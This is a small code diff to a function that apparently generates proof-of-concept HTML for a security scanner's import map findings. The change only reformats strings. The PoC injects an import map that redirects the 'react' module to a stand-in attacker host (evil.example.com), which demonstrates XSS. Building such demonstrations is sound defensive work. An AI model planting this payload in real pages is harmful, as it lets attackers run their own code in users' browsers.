@@ -289,12 +289,12 @@ def build_poc_html(page_url: str, violation_type: str = "",
     """Build a minimal PoC HTML snippet demonstrating the import map issue."""
     if violation_type == "import_map_user_controlled":
         return (
-            f'<!-- PoC: Inject into the import map -->\n'
-            f'<script type="importmap">\n'
-            f'{{"imports": {{"react": "https://evil.example.com/react.js"}}}}\n'
-            f'</script>\n'
-            f'<script type="module">import "react";</script>\n'
-            f'<!-- Attacker controls the module URL -> XSS -->'
+            '<!-- PoC: Inject into the import map -->\n'
+            '<script type="importmap">\n'
+            '{"imports": {"react": "https://evil.example.com/react.js"}}\n'
+            '</script>\n'
+            '<script type="module">import "react";</script>\n'
+            '<!-- Attacker controls the module URL -> XSS -->'
         )
     if violation_type == "import_map_cross_origin":
         target = resource_url or "https://cdn.example.com/lib.js"
